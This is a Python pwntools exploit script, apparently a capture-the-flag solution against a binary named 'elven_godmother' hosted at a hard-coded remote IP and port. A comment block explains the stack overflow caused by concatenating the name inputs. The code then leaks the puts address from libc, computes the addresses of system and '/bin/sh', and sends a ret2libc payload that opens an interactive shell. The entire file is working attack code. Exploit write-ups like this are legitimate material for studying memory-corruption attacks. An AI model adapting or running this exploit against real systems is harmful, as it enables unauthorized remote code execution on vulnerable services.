import sys
from pwn import *
from hexdump import hexdump

"""
the overflow occurs when `dest` is constructed as the concatenation
of first_name and surname input strings;
dest is at ebp-0x10c, meaning that ret is at 0x110 (272)
thus, we choose to input:
    - first_name: random 240-len string
    - surname: 32 (=272-240) random + return address

now that we control the flow,
we leak puts address from libc by calling puts_plt(puts_got),
and then call main again
using the leak, we compute system and /bin/sh addresses from libc

we then input a second payload, calling system(/bin/sh)
"""

exec_file = "./elven_godmother"
libc_file = "./libc.so.6"
context.binary = exec_file

e = ELF(exec_file)
libc = ELF(libc_file)

offset = 272 # 0x10c + 0x4
name_len = 240

# io = process(exec_file)
io = remote("141.85.224.101", 31337)

# 1) leak puts address from libc by calling puts_plt(puts_got)
puts_plt = e.symbols['puts']
puts_got = e.symbols['got.puts']
main_address = e.symbols['main']

# io.recvuntil("What is your first name? ")
io.recv()
payload = "A" * name_len
io.sendline(payload)

# this controls the ret address
# io.recvuntil("What is your last name? ")
io.recv()
payload = "A" * (offset - name_len) + p32(puts_plt) + p32(main_address) + p32(puts_got)
io.sendline(payload)

# io.recvuntil("What is your gender? (m/f) ")
io.recv()
io.sendline("m")

# 1') compute system address
leak = io.recvline()
hexdump(leak)
puts_address = unpack(leak[27:31]) # [27:31] because the prompt gets _merged_ with leak by recvline()

log.info("puts_address: [0x{:08x}]".format(puts_address))
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search("/bin/sh\x00"))
libc_start_address = puts_address - puts_offset
system_address = libc_start_address + system_offset
bin_sh_address = libc_start_address + bin_sh_offset

# 2) call system(/bin/sh)
# io.recvuntil("What is your first name? ")
io.recv()
payload = "A" * name_len
io.sendline(payload)

# io.recvuntil("What is your last name? ")
io.recv()
payload = "A" * (offset - name_len) + p32(system_address) + p32(main_address) + p32(bin_sh_address)
io.sendline(payload)

# io.recvuntil("What is your gender? (m/f) ")
io.recv()
io.sendline("m")

io.interactive()
